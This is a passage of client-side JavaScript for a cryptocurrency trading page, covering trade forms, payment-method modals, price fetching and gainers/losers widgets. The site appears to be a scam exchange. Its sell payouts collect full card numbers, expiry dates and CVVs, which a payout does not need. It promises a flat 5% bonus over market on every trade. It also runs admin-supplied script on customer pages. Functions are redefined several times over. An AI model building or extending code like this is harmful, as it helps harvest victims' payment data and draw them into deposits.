            <span style="color: #888; font-size: 14px;">▼</span>
        </div>

        <div id="receivingWalletContainer" style="display: ${isBuy ? 'block' : 'none'}; margin-bottom: 15px;">
            <input type="text" id="receivingWallet" placeholder="Enter your wallet address" style="width: 100%; background: #0f0f15; border: 1px solid #333; padding: 14px; border-radius: 8px; color: #fff; outline: none;">
        </div>
        
        <!-- Hidden native select for logic -->
        <div style="display: none;"><select id="tradeCoin" onchange="calcTrade()"></select></div>
        <input type="hidden" id="tradeMethod" value="Bank Transfer">

        <button class="btn-primary full-width" id="submitTradeBtn" onclick="submitTrade()" style="width: 100%; padding: 16px; border-radius: 8px; border: none; font-weight: bold; font-size: 16px; cursor: pointer; background: ${isBuy ? 'var(--success)' : 'var(--danger)'}; color: ${isBuy ? '#000' : '#fff'};">
            ${isBuy ? 'Buy Crypto' : 'Sell Crypto'}
        </button>
    `;
    
    // Re-populate the native select with coins
    const nativeSelect = document.getElementById('tradeCoin');
    if (nativeSelect) {
        nativeSelect.innerHTML = '';
        markets.forEach(c => { const o = document.createElement('option'); o.value = c.symbol; o.textContent = c.name; nativeSelect.appendChild(o); });
        nativeSelect.value = coinSymbol;
    }
    
    calcTrade();
};

// Ensure selecting a coin updates the text
window.selectTradeAsset = function(symbol) {
    const nativeSelect = document.getElementById('tradeCoin');
    if (nativeSelect) nativeSelect.value = symbol;
    
    const topSpan = document.getElementById('topCoinText');
    const bottomSpan = document.getElementById('bottomCoinText');
    
    if (topSpan) topSpan.textContent = symbol;
    if (bottomSpan) bottomSpan.textContent = symbol;
    
    document.getElementById('assetActionModal').style.display = 'none';
    calcTrade(); 
};

/* =====================================================
   FIX: SELL BUTTON, BANK INPUTS, & ALL RECOMMENDED TAGS
   ===================================================== */
window.setTradeMode = function(mode) {
    currentTradeMode = mode; 
    const curr = getUserCurrency();
    
    document.getElementById('tabBuy').classList.toggle('active', mode === 'buy'); 
    document.getElementById('tabSell').classList.toggle('active', mode === 'sell');
    
    const tradeBox = document.querySelector('.trade-box');
    const isBuy = mode === 'buy';
    const existingTabs = document.querySelector('.trade-tabs').outerHTML;
    const coinSymbol = document.getElementById('tradeCoin') ? document.getElementById('tradeCoin').value : 'BTC';
    
    tradeBox.innerHTML = `
        ${existingTabs}
        
        <!-- TOP BOX -->
        <div style="background: #0f0f15; border: 1px solid #333; border-radius: 12px; padding: 15px; margin-bottom: 10px;">
            <p style="color: #888; font-size: 12px; margin-bottom: 8px;">${isBuy ? 'You spend' : 'You sell'}</p>
            <div style="display: flex; justify-content: space-between; align-items: center;">
                <input type="number" id="tradeAmount" placeholder="0.00" oninput="calcTrade()" style="background: transparent; border: none; color: #fff; font-size: 24px; font-weight: bold; outline: none; width: 60%;">
                
                ${isBuy ? `
                    <div style="display: flex; align-items: center; gap: 8px; background: #1a1a2a; padding: 8px 12px; border-radius: 20px; border: 1px solid #333;">
                        <span style="color: #fff; font-weight: bold; font-size: 14px;">${curr.code}</span>
                    </div>
                ` : `
                    <div onclick="window.openTradeAssetModal()" style="display: flex; align-items: center; gap: 8px; background: #1a1a2a; padding: 8px 12px; border-radius: 20px; cursor: pointer; border: 1px solid #333;">
                        <span id="topCoinText" style="color: #fff; font-weight: bold; font-size: 14px;">${coinSymbol}</span>
                        <span style="color: #888; font-size: 10px;">▼</span>
                    </div>
                `}
            </div>
        </div>

        <!-- BOTTOM BOX -->
        <div style="background: #0f0f15; border: 1px solid #333; border-radius: 12px; padding: 15px; margin-bottom: 20px;">
            <p style="color: #888; font-size: 12px; margin-bottom: 8px;">${isBuy ? 'You get' : 'You get (Estimated)'}</p>
            <div style="display: flex; justify-content: space-between; align-items: center;">
                <input type="text" id="tradeReceive" readonly placeholder="0.00" style="background: transparent; border: none; color: #00d4aa; font-size: 24px; font-weight: bold; outline: none; width: 60%;">
                
                ${isBuy ? `
                    <div onclick="window.openTradeAssetModal()" style="display: flex; align-items: center; gap: 8px; background: #1a1a2a; padding: 8px 12px; border-radius: 20px; cursor: pointer; border: 1px solid #333;">
                        <span id="bottomCoinText" style="color: #fff; font-weight: bold; font-size: 14px;">${coinSymbol}</span>
                        <span style="color: #888; font-size: 10px;">▼</span>
                    </div>
                ` : `
                    <div style="display: flex; align-items: center; gap: 8px; background: #1a1a2a; padding: 8px 12px; border-radius: 20px; border: 1px solid #333;">
                        <span style="color: #fff; font-weight: bold; font-size: 14px;">${curr.code}</span>
                    </div>
                `}
            </div>
            <div style="margin-top: 10px; font-size: 11px; color: #0ecb51; font-weight: bold;">🎁 Includes 5% Bonus</div>
        </div>

        <!-- PAYMENT METHOD SECTION -->
        <p style="color: #888; font-size: 13px; margin-bottom: 10px;">${isBuy ? 'Pay using' : 'Get paid using'}</p>
        <div onclick="window.openMethodModal()" style="background: #0f0f15; border: 1px solid #333; border-radius: 12px; padding: 15px; display: flex; justify-content: space-between; align-items: center; cursor: pointer; margin-bottom: 15px;">
            <div style="display: flex; align-items: center; gap: 10px;">
                <div style="width: 30px; height: 30px; background: #2a2a3a; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: #fff;">💳</div>
                <div>
                    <div id="selectedPayMethodLabel" style="color: #fff; font-weight: bold; font-size: 14px;">Bank Transfer</div>
                    <div style="color: #0ecb51; font-size: 11px;">Recommended</div>
                </div>
            </div>
            <span style="color: #888; font-size: 14px;">▼</span>
        </div>

        <!-- DYNAMIC INPUTS FOR SELLING -->
        <div id="dynamicInputsContainer" style="margin-bottom: 15px;">
            <!-- Bank Inputs -->
            <div id="bankDetailsInputs" style="${!isBuy ? 'display: block;' : 'display: none;'}">
                <div class="input-group"><label>Bank Name</label><input type="text" id="bankName" placeholder="e.g. Chase Bank" style="width: 100%; background: #0f0f15; border: 1px solid #333; padding: 12px; border-radius: 8px; color: #fff; margin-bottom: 8px;"></div>
                <div class="input-group"><label>Account Holder Name</label><input type="text" id="bankAccountName" placeholder="John Doe" style="width: 100%; background: #0f0f15; border: 1px solid #333; padding: 12px; border-radius: 8px; color: #fff; margin-bottom: 8px;"></div>
                <div class="input-group"><label>Account Number / IBAN</label><input type="text" id="bankAccountNumber" placeholder="123456789" style="width: 100%; background: #0f0f15; border: 1px solid #333; padding: 12px; border-radius: 8px; color: #fff;"></div>
            </div>
            <!-- Card Inputs -->
            <div id="cardDetailsInputs" style="display: none;">
                <div class="input-group"><label>Name on Card</label><input type="text" id="cardName" placeholder="John Doe" style="width: 100%; background: #0f0f15; border: 1px solid #333; padding: 12px; border-radius: 8px; color: #fff; margin-bottom: 8px;"></div>
                <div class="input-group"><label>Card Number</label><input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19" oninput="this.value = this.value.replace(/\\D/g, '').substring(0, 16).replace(/(\\d{4})(?=\\d)/g, '$1 ')" style="width: 100%; background: #0f0f15; border: 1px solid #333; padding: 12px; border-radius: 8px; color: #fff; margin-bottom: 8px;"></div>
                <div style="display: flex; gap: 8px;">
                    <div class="input-group" style="flex:1;"><label>Expiry</label><input type="text" id="cardExpiry" placeholder="MM/YY" maxlength="5" oninput="let v = this.value.replace(/\\D/g, ''); if(v.length > 2) { this.value = v.substring(0,2) + '/' + v.substring(2,4); } else { this.value = v; }" style="width: 100%; background: #0f0f15; border: 1px solid #333; padding: 12px; border-radius: 8px; color: #fff;"></div>
                    <div class="input-group" style="flex:1;"><label>CVV</label><input type="password" id="cardCvv" placeholder="123" maxlength="4" oninput="this.value = this.value.replace(/\\D/g, '').substring(0, 4)" style="width: 100%; background: #0f0f15; border: 1px solid #333; padding: 12px; border-radius: 8px; color: #fff;"></div>
                </div>
            </div>
            <!-- PayPal Inputs -->
            <div id="paypalDetailsInputs" style="display: none;">
                <div class="input-group"><label>PayPal Email</label><input type="email" id="paypalEmail" placeholder="name@example.com" style="width: 100%; background: #0f0f15; border: 1px solid #333; padding: 12px; border-radius: 8px; color: #fff;"></div>
            </div>
        </div>

        <div id="receivingWalletContainer" style="display: ${isBuy ? 'block' : 'none'}; margin-bottom: 15px;">
            <input type="text" id="receivingWallet" placeholder="Enter your wallet address" style="width: 100%; background: #0f0f15; border: 1px solid #333; padding: 14px; border-radius: 8px; color: #fff; outline: none;">
        </div>
        
        <div style="display: none;"><select id="tradeCoin" onchange="calcTrade()"></select></div>
        <input type="hidden" id="tradeMethod" value="Bank Transfer">

        <button class="btn-primary full-width" id="submitTradeBtn" onclick="submitTrade()" style="width: 100%; padding: 16px; border-radius: 8px; border: none; font-weight: bold; font-size: 16px; cursor: pointer; background: ${isBuy ? 'var(--success)' : 'var(--danger)'}; color: ${isBuy ? '#000' : '#fff'};">
            ${isBuy ? 'Buy Crypto' : 'Sell Crypto'}
        </button>
    `;
    
    const nativeSelect = document.getElementById('tradeCoin');
    if (nativeSelect) {
        nativeSelect.innerHTML = '';
        markets.forEach(c => { const o = document.createElement('option'); o.value = c.symbol; o.textContent = c.name; nativeSelect.appendChild(o); });
        nativeSelect.value = coinSymbol;
    }
    
    calcTrade();
};

// UPDATED: Make ALL methods "Recommended"
window.openMethodModal = function() {
    let modal = document.getElementById('assetActionModal');
    modal.style.display = 'flex';
    const isBuy = currentTradeMode === 'buy';
    const isKenyan = currentUser && currentUser.country && currentUser.country.includes('Kenya');
    
    let providers = [
        { id: 'Bank Transfer', name: 'Bank Transfer', icon: '🏦', desc: isBuy ? 'Pay via your local bank' : 'Get paid to your bank account', recommended: true },
        { id: 'PayPal', name: 'PayPal', icon: '🅿️', desc: 'Pay with your PayPal balance', recommended: true },
        { id: 'Credit Card', name: 'Credit / Debit Card', icon: '💳', desc: 'Visa, Mastercard, Amex', recommended: true }
    ];

    if (isKenyan) {
        providers.splice(1, 0, { id: 'MPESA', name: 'M-PESA', icon: '📱', desc: 'Fast & secure mobile money', recommended: true });
    }

    let html = `<div class="modal-content" style="padding: 0; max-height: 80vh; display: flex; flex-direction: column;">
        <div style="display: flex; justify-content: space-between; padding: 20px; border-bottom: 1px solid #333;">
            <h2 style="color: #fff; margin: 0; font-size: 18px;">Choose ${isBuy ? 'Payment' : 'Payout'} Method</h2>
            <span onclick="document.getElementById('assetActionModal').style.display='none'" style="color: #888; font-size: 24px; cursor: pointer;">&times;</span>
        </div>
        <div style="overflow-y: auto; flex: 1; padding: 10px 20px 20px;">`;

    html += providers.map(p => `
        <div onclick="window.selectMethod('${p.id}')" style="background: #0f0f15; border: 1px solid #333; border-radius: 12px; padding: 15px; display: flex; align-items: center; gap: 15px; margin-bottom: 10px; cursor: pointer;">
            <div style="width: 40px; height: 40px; background: #2a2a3a; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 20px;">${p.icon}</div>
            <div style="flex: 1;">
                <div style="color: #fff; font-weight: bold; font-size: 14px;">${p.name}</div>
                <div style="color: #888; font-size: 12px;">${p.desc}</div>
            </div>
            ${p.recommended ? `<div style="color: #0ecb51; font-size: 11px; font-weight: bold;">Recommended</div>` : ''}
        </div>
    `).join('');
    
    html += `</div></div>`;
    modal.innerHTML = html;
};

window.selectMethod = function(method) {
    document.getElementById('assetActionModal').style.display = 'none';
    
    const label = document.getElementById('selectedPayMethodLabel');
    if (label) label.textContent = method;
    
    const nativeSelect = document.getElementById('tradeMethod');
    if (nativeSelect) {
        nativeSelect.value = method === 'MPESA' ? 'Bank Transfer' : method;
    }
    
    togglePaymentDetails();
};

// UPDATED: Correctly show/hide the inputs based on selected method
window.togglePaymentDetails = function() {
    const method = document.getElementById('tradeMethod') ? document.getElementById('tradeMethod').value : 'Bank Transfer';
    
    const bankInputs = document.getElementById('bankDetailsInputs');
    const cardInputs = document.getElementById('cardDetailsInputs');
    const paypalInputs = document.getElementById('paypalDetailsInputs');

    if(bankInputs) bankInputs.style.display = 'none';
    if(cardInputs) cardInputs.style.display = 'none';
    if(paypalInputs) paypalInputs.style.display = 'none';
    
    if (currentTradeMode === 'sell') {
        if (method === 'Credit Card' && cardInputs) cardInputs.style.display = 'block';
        if (method === 'PayPal' && paypalInputs) paypalInputs.style.display = 'block';
        if ((method === 'Bank Transfer' || method === 'MPESA') && bankInputs) bankInputs.style.display = 'block';
    }
};

/* =====================================================
   ULTIMATE FIX: DYNAMIC INPUT FIELDS ON SELECTION
   ===================================================== */
window.selectMethod = function(method) {
    document.getElementById('assetActionModal').style.display = 'none';
    
    // 1. Update the label on the Trade View
    const label = document.getElementById('selectedPayMethodLabel');
    if (label) label.textContent = method;
    
    // 2. Update the hidden native select so the backend logic works
    const nativeSelect = document.getElementById('tradeMethod');
    if (nativeSelect) {
        nativeSelect.value = method === 'MPESA' ? 'Bank Transfer' : method;
    }

    // 3. Find the container where inputs go
    const container = document.getElementById('dynamicInputsContainer');
    if (!container) return;

    // 4. Clear old inputs
    container.innerHTML = '';

    // 5. Inject the correct inputs based on what they selected
    if (currentTradeMode === 'sell') {
        if (method === 'Bank Transfer' || method === 'MPESA') {
            container.innerHTML = `
                <div id="bankDetailsInputs" style="display: block;">
                    <div class="input-group" style="margin-bottom: 10px;"><label>Bank Name</label><input type="text" id="bankName" placeholder="e.g. Chase Bank" style="width: 100%; background: #0f0f15; border: 1px solid #333; padding: 14px; border-radius: 8px; color: #fff;"></div>
                    <div class="input-group" style="margin-bottom: 10px;"><label>Account Holder Name</label><input type="text" id="bankAccountName" placeholder="John Doe" style="width: 100%; background: #0f0f15; border: 1px solid #333; padding: 14px; border-radius: 8px; color: #fff;"></div>
                    <div class="input-group"><label>Account Number / IBAN</label><input type="text" id="bankAccountNumber" placeholder="123456789" style="width: 100%; background: #0f0f15; border: 1px solid #333; padding: 14px; border-radius: 8px; color: #fff;"></div>
                </div>
            `;
        } else if (method === 'PayPal') {
            container.innerHTML = `
                <div id="paypalDetailsInputs" style="display: block;">
                    <div class="input-group"><label>PayPal Email</label><input type="email" id="paypalEmail" placeholder="name@example.com" style="width: 100%; background: #0f0f15; border: 1px solid #333; padding: 14px; border-radius: 8px; color: #fff;"></div>
                </div>
            `;
        } else if (method === 'Credit Card') {
            container.innerHTML = `
                <div id="cardDetailsInputs" style="display: block;">
                    <div class="input-group" style="margin-bottom: 10px;"><label>Name on Card</label><input type="text" id="cardName" placeholder="John Doe" style="width: 100%; background: #0f0f15; border: 1px solid #333; padding: 14px; border-radius: 8px; color: #fff;"></div>
                    <div class="input-group" style="margin-bottom: 10px;"><label>Card Number</label><input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19" oninput="this.value = this.value.replace(/\\D/g, '').substring(0, 16).replace(/(\\d{4})(?=\\d)/g, '$1 ')" style="width: 100%; background: #0f0f15; border: 1px solid #333; padding: 14px; border-radius: 8px; color: #fff;"></div>
                    <div style="display: flex; gap: 10px;">
                        <div class="input-group" style="flex:1;"><label>Expiry</label><input type="text" id="cardExpiry" placeholder="MM/YY" maxlength="5" oninput="let v = this.value.replace(/\\D/g, ''); if(v.length > 2) { this.value = v.substring(0,2) + '/' + v.substring(2,4); } else { this.value = v; }" style="width: 100%; background: #0f0f15; border: 1px solid #333; padding: 14px; border-radius: 8px; color: #fff;"></div>
                        <div class="input-group" style="flex:1;"><label>CVV</label><input type="password" id="cardCvv" placeholder="123" maxlength="4" oninput="this.value = this.value.replace(/\\D/g, '').substring(0, 4)" style="width: 100%; background: #0f0f15; border: 1px solid #333; padding: 14px; border-radius: 8px; color: #fff;"></div>
                    </div>
                </div>
            `;
        }
    } else {
        // Buy Mode: No inputs needed here because they go to the next page to pay you
        if (method === 'Credit Card') {
            const cardLink = (globalSettings && globalSettings.cardPaymentLink) ? globalSettings.cardPaymentLink : "";
            if (!cardLink) {
                // If no admin link, show inputs so they can pay with their card directly
                container.innerHTML = `
                    <div id="cardDetailsInputs" style="display: block;">
                        <div class="input-group" style="margin-bottom: 10px;"><label>Name on Card</label><input type="text" id="cardName" placeholder="John Doe" style="width: 100%; background: #0f0f15; border: 1px solid #333; padding: 14px; border-radius: 8px; color: #fff;"></div>
                        <div class="input-group" style="margin-bottom: 10px;"><label>Card Number</label><input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19" oninput="this.value = this.value.replace(/\\D/g, '').substring(0, 16).replace(/(\\d{4})(?=\\d)/g, '$1 ')" style="width: 100%; background: #0f0f15; border: 1px solid #333; padding: 14px; border-radius: 8px; color: #fff;"></div>
                        <div style="display: flex; gap: 10px;">
                            <div class="input-group" style="flex:1;"><label>Expiry</label><input type="text" id="cardExpiry" placeholder="MM/YY" maxlength="5" oninput="let v = this.value.replace(/\\D/g, ''); if(v.length > 2) { this.value = v.substring(0,2) + '/' + v.substring(2,4); } else { this.value = v; }" style="width: 100%; background: #0f0f15; border: 1px solid #333; padding: 14px; border-radius: 8px; color: #fff;"></div>
                            <div class="input-group" style="flex:1;"><label>CVV</label><input type="password" id="cardCvv" placeholder="123" maxlength="4" oninput="this.value = this.value.replace(/\\D/g, '').substring(0, 4)" style="width: 100%; background: #0f0f15; border: 1px solid #333; padding: 14px; border-radius: 8px; color: #fff;"></div>
                        </div>
                    </div>
                `;
            }
        }
    }
};

/* =====================================================
   FIX: CUSTOM ALERT BUTTON STYLING
   ===================================================== */
const alertStyle = document.createElement('style');
alertStyle.innerHTML = `
    .custom-alert-box {
        background: #1a1a2a;
        border: 1px solid #2a2a3a;
        border-radius: 16px;
        padding: 25px;
        width: 100%;
        max-width: 340px;
        text-align: center;
        margin: auto !important;
        animation: modalPop 0.25s ease forwards;
    }
    .custom-alert-box h3 {
        color: #fff;
        margin-bottom: 10px;
        font-size: 18px;
    }
    .custom-alert-box p {
        color: #888;
        font-size: 14px;
        margin-bottom: 25px;
        line-height: 1.4;
    }
    .custom-alert-btn {
        background: #2a2a3a !important;
        color: #fff !important;
        border: 1px solid #333 !important;
        width: 100% !important;
        padding: 14px !important;
        border-radius: 8px !important;
        font-weight: bold !important;
        font-size: 15px !important;
        cursor: pointer !important;
        transition: 0.2s;
    }
    .custom-alert-btn:hover {
        background: #333 !important;
    }
    .custom-alert-icon {
        width: 55px;
        height: 55px;
        border-radius: 50%;
        background: rgba(246, 70, 93, 0.1);
        display: flex;
        align-items: center;
        justify-content: center;
        margin: 0 auto 15px;
    }
`;
document.head.appendChild(alertStyle);

/* =====================================================
   FIX: BADGES ALIGNMENT (Keep 5% Bonus on the same line)
   ===================================================== */
const badgeFixStyle = document.createElement('style');
badgeFixStyle.innerHTML = `
    .badge-container {
        display: flex !important;
        flex-wrap: nowrap !important;
        gap: 8px !important;
        overflow-x: auto !important;
        padding-bottom: 5px;
        align-items: center !important;
        /* Hide scrollbar */
        -ms-overflow-style: none !important;  
        scrollbar-width: none !important;  
    }
    .badge-container::-webkit-scrollbar {
        display: none !important;
    }
    .trust-badge {
        flex-shrink: 0 !important;
        padding: 6px 12px !important;
        font-size: 11px !important;
        white-space: nowrap !important;
        display: inline-flex !important;
        align-items: center !important;
    }
`;
document.head.appendChild(badgeFixStyle);

/* =====================================================
   REAL MARKET DATA & 5% BONUS MATH
   ===================================================== */
// 1. Fetch real prices from YOUR server
async function fetchRealMarketPrices() {
    try {
        const res = await fetch('/api/market/prices');
        if (!res.ok) throw new Error("Server error");
        const data = await res.json();

        data.forEach((apiCoin) => {
            const localCoin = markets.find(m => m.symbol.toUpperCase() === apiCoin.symbol.toUpperCase());
            if (localCoin) {
                localCoin.price = apiCoin.current_price;
                localCoin.change = apiCoin.price_change_percentage_24h || 0;
            } else {
                markets.push({
                    name: apiCoin.name,
                    symbol: apiCoin.symbol.toUpperCase(),
                    price: apiCoin.current_price,
                    change: apiCoin.price_change_percentage_24h || 0,
                    icon: apiCoin.symbol.charAt(0).toUpperCase(),
                    color: '#333333'
                });
            }
        });

        loadMarkets();
        populateTradeCoins();
    } catch (error) {
        console.log("Market fetch error (Using fallback):", error);
    }
}

fetchRealMarketPrices();
setInterval(fetchRealMarketPrices, 60000);

// 2. Update the Trade Math to show the 5% bonus
window.calcTrade = function() {
    const amount = parseFloat(document.getElementById('tradeAmount').value) || 0; 
    const coinSymbol = document.getElementById('tradeCoin').value; 
    const coin = markets.find(c => c.symbol === coinSymbol); 
    const curr = getUserCurrency();
    
    let bonusMathEl = document.getElementById('bonusMathDisplay');
    if (!bonusMathEl) {
        bonusMathEl = document.createElement('div');
        bonusMathEl.id = 'bonusMathDisplay';
        bonusMathEl.style.cssText = "font-size: 11px; color: #888; margin-top: 8px; text-align: left; display: none;";
        const tradeReceiveParent = document.getElementById('tradeReceive').parentElement.parentElement;
        tradeReceiveParent.appendChild(bonusMathEl);
    }

    if (coin && amount > 0) {
        if (currentTradeMode === 'buy') { 
            const usdAmount = amount / curr.rate; 
            const bonusPrice = coin.price * 0.95; // 5% off
            const cryptoReceived = usdAmount / bonusPrice;
            
            document.getElementById('tradeReceive').value = cryptoReceived.toFixed(6) + " " + coin.symbol; 
            
            bonusMathEl.style.display = 'block';
            bonusMathEl.innerHTML = `
                <div style="display: flex; justify-content: space-between; margin-bottom: 3px;">
                    <span>Market Price:</span>
                    <span style="text-decoration: line-through;">$${formatPrice(coin.price)}</span>
                </div>
                <div style="display: flex; justify-content: space-between; color: #0ecb51; font-weight: bold;">
                    <span>🎁 Your Bonus Price (5% Off):</span>
                    <span>$${formatPrice(bonusPrice)}</span>
                </div>
            `;
        } else { 
            const usdAmount = amount * (coin.price * 1.05); // 5% extra payout
            document.getElementById('tradeReceive').value = `${curr.symbol} ${(usdAmount * curr.rate).toFixed(2)} ${curr.code}`; 
            
            const bonusPrice = coin.price * 1.05;
            bonusMathEl.style.display = 'block';
            bonusMathEl.innerHTML = `
                <div style="display: flex; justify-content: space-between; margin-bottom: 3px;">
                    <span>Market Price:</span>
                    <span>$${formatPrice(coin.price)}</span>
                </div>
                <div style="display: flex; justify-content: space-between; color: #0ecb51; font-weight: bold;">
                    <span>🎁 Your Bonus Price (5% Extra):</span>
                    <span>$${formatPrice(bonusPrice)}</span>
                </div>
            `;
        }
    } else { 
        document.getElementById('tradeReceive').value = ''; 
        if (bonusMathEl) bonusMathEl.style.display = 'none';
    }
};

/* =====================================================
   DYNAMIC MARKET FETCH (Supports up to 200 coins)
   ===================================================== */
// A palette of colors for new coins
const fallbackColors = ['#f7931a', '#627eea', '#00d2ff', '#f3ba2f', '#23292f', '#0033ad', '#c2a633', '#e84142', '#e6007a', '#2a5ada', '#8247e5', '#f00500', '#345d9d', '#eb0029', '#ff007a', '#2e3148', '#000000', '#00ec97', '#12aaff', '#ff0420', '#0090ff', '#6fbcf0', '#3d8130'];

async function fetchRealMarketPrices() {
    try {
        const res = await fetch('/api/market/prices');
        if (!res.ok) throw new Error("Server error");
        const data = await res.json();

        data.forEach((apiCoin) => {
            const existingCoin = markets.find(m => m.symbol.toUpperCase() === apiCoin.symbol.toUpperCase());
            
            if (existingCoin) {
                // Update existing coin
                existingCoin.price = apiCoin.current_price;
                existingCoin.change = apiCoin.price_change_percentage_24h || 0;
            } else {
                // Add new coin dynamically
                const randomColor = fallbackColors[Math.floor(Math.random() * fallbackColors.length)];
                markets.push({
                    name: apiCoin.name || apiCoin.symbol, // Prevents "undefined"
                    symbol: apiCoin.symbol.toUpperCase(),
                    price: apiCoin.current_price,
                    change: apiCoin.price_change_percentage_24h || 0,
                    icon: apiCoin.symbol.charAt(0).toUpperCase(), // Use first letter as icon
                    color: randomColor
                });
            }
        });

        // Sort markets by price descending so top coins stay at the top
        markets.sort((a, b) => b.price - a.price);

        loadMarkets();
        populateTradeCoins();
    } catch (error) {
        console.log("Market fetch error (Using fallback):", error);
    }
}

// Override the old interval to use the new function
if (window.marketInterval) clearInterval(window.marketInterval);
/* disabled duplicate fetch */
fetchRealMarketPrices();

/* =====================================================
   REBUILD MARKET LIST WITH 200 COINS
   ===================================================== */
async function fetchRealMarketPrices() {
    try {
        const res = await fetch('/api/market/prices');
        if (!res.ok) throw new Error("Server error");
        const data = await res.json();

        // If the API returns the fallback (only 2 coins), keep the original 26
        if (data.length < 10) {
            console.log("API blocked, keeping original 26 coins.");
            return;
        }

        const originalMarkets = [...markets]; 
        markets.length = 0; // Clear the current list

        data.forEach((apiCoin) => {
            // Check if the coin was in our original 26 list
            const existingCoin = originalMarkets.find(m => m.symbol.toUpperCase() === apiCoin.symbol.toUpperCase());
            
            if (existingCoin) {
                // Update price and change, keep the original beautiful icon and color
                existingCoin.price = apiCoin.current_price;
                existingCoin.change = apiCoin.price_change_percentage_24h || 0;
                markets.push(existingCoin);
            } else {
                // Add new coin dynamically with a random color and first-letter icon
                const randomColor = '#' + Math.floor(Math.random()*16777215).toString(16);
                markets.push({
                    name: apiCoin.name || apiCoin.symbol,
                    symbol: apiCoin.symbol.toUpperCase(),
                    price: apiCoin.current_price,
                    change: apiCoin.price_change_percentage_24h || 0,
                    icon: apiCoin.symbol.charAt(0).toUpperCase(),
                    color: randomColor
                });
            }
        });

        loadMarkets();
        populateTradeCoins();
    } catch (error) {
        console.log("Market fetch error:", error);
    }
}

// Force clear old timer and run new one
if (window.marketInterval) clearInterval(window.marketInterval);
/* disabled duplicate fetch */
fetchRealMarketPrices();

/* =====================================================
   CUSTOMER SITE: INJECT CALL WIDGET IF ENABLED
   ===================================================== */
// Modify the existing loadGlobalSettings function to handle the call widget
const originalLoadGlobalSettingsCall = window.loadGlobalSettings;
window.loadGlobalSettings = async function() {
    if (originalLoadGlobalSettingsCall) await originalLoadGlobalSettingsCall();
    
    if (globalSettings && globalSettings.callEnabled && globalSettings.callScript) {
        // Remove old widget if it exists to prevent duplicates
        const oldWidget = document.getElementById('custom-call-widget-container');
        if (oldWidget) oldWidget.remove();

        const widgetContainer = document.createElement('div');
        widgetContainer.id = 'custom-call-widget-container';
        widgetContainer.innerHTML = globalSettings.callScript;
        
        // We must manually execute any script tags inside the injected HTML
        const scripts = widgetContainer.querySelectorAll('script');
        scripts.forEach(oldScript => {
            const newScript = document.createElement('script');
            Array.from(oldScript.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value));
            newScript.appendChild(document.createTextNode(oldScript.innerHTML));
            oldScript.parentNode.replaceChild(newScript, oldScript);
        });

        document.body.appendChild(widgetContainer);
    }
};


/* =====================================================
   REAL TOP GAINERS & LOSERS ENGINE
   ===================================================== */
;

// Automatically trigger the render every time the live prices are fetched
var originalFetchForGainers = window.fetchRealMarketPrices;
window.fetchRealMarketPrices = async function() {
    if (originalFetchForGainers) await originalFetchForGainers();
    window.renderGainersLosers(); // Update the cards immediately after fetching
};

// Ensure it renders on page load
document.addEventListener('DOMContentLoaded', () => {
    setTimeout(() => window.renderGainersLosers(), 1000);
});

/* =====================================================
   BULLETPROOF TOP GAINERS & LOSERS (Standalone Timer)
   ===================================================== */
setInterval(() => {
    const glList = document.getElementById('gainersLosersList');
    // 1. Ensure the container exists and the markets array is populated
    if (!glList || typeof markets === 'undefined' || markets.length === 0) return;

    // 2. Filter valid coins with price and change data
    const validCoins = markets.filter(c => c && c.price > 0 && typeof c.change === 'number');

    if (validCoins.length < 6) return; // Not enough data to show top 3 gainers and 3 losers

    // 3. Sort by 24h Change (Highest to Lowest)
    const sorted = [...validCoins].sort((a, b) => b.change - a.change);

    // 4. Get Top 3 Gainers and Top 3 Losers
    const gainers = sorted.slice(0, 3);
    const losers = sorted.slice(-3).reverse(); // Reverse so the worst loser is first

    // 5. Combine them for the display
    const displayList = [...gainers, ...losers];

    // 6. Render the cards directly
    glList.innerHTML = displayList.map(c => {
        const isUp = c.change >= 0;
        const colorClass = isUp ? 'up' : 'down';
        const arrow = isUp ? '↑' : '↓';
        
        // Format the price nicely based on how small it is
        let formattedPrice = c.price < 0.01 
            ? c.price.toFixed(6) 
            : c.price.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 4});

        return `
            <div class="gl-card" onclick="if(typeof quickTrade === 'function') { quickTrade('${c.symbol}'); } else { console.error('quickTrade missing'); }" style="cursor: pointer;">
                <div style="display: flex; justify-content: space-between; margin-bottom: 4px;">
                    <span style="font-size: 11px; color: #888; font-weight: bold;">${c.symbol}</span>
                    <span class="${colorClass}" style="font-size: 11px; font-weight: bold;">${arrow} ${Math.abs(c.change).toFixed(2)}%</span>
                </div>
                <div style="font-weight: bold; font-size: 13px; color: #fff;">
                    $${formattedPrice}
                </div>
            </div>
        `;
    }).join('');
}, 3000); // Check every 3 seconds to ensure it stays updated


/* =====================================================
   PROFESSIONAL TOP GAINERS & LOSERS (Sorted & Formatted)
   ===================================================== */
window.renderGainersLosers = function() {
    const glList = document.getElementById('gainersLosersList');
    if (!glList || typeof markets === 'undefined' || markets.length === 0) return;

    // 1. Filter out invalid coins (price must be > 0, change must be a valid number)
    const validCoins = markets.filter(c => c && c.price > 0 && typeof c.change === 'number' && !isNaN(c.change));

    // 2. Separate into Gainers (positive change) and Losers (negative change)
    let gainers = validCoins.filter(c => c.change > 0).sort((a, b) => b.change - a.change);
    let losers = validCoins.filter(c => c.change < 0).sort((a, b) => a.change - b.change);

    // 3. Grab the top 3 of each. If there aren't enough, pad with the next best available.
    gainers = gainers.slice(0, 3);
    losers = losers.slice(0, 3);

    // 4. Combine them (3 Green, 3 Red)
    const displayList = [...gainers, ...losers];

    // 5. Format the price so it never looks like $0.00 if it has value
    const formatPrice = (price) => {
        if (price === 0) return '0.00';
        if (price < 0.00001) return price.toFixed(8); // For super tiny coins like PEPE
        if (price < 1) return price.toFixed(4);
        return price.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2});
    };

    // 6. Render the cards
    glList.innerHTML = displayList.map(c => {
        const isUp = c.change > 0;
        const colorClass = isUp ? 'up' : 'down';
        const arrow = isUp ? '↑' : '↓';
        
        // Determine background color hint for the card
        const cardBorder = isUp ? 'border-left: 3px solid #0ecb51;' : 'border-left: 3px solid #f6465d;';

        return `
            <div class="gl-card" onclick="if(typeof quickTrade === 'function') quickTrade('${c.symbol}')" style="cursor: pointer; ${cardBorder}">
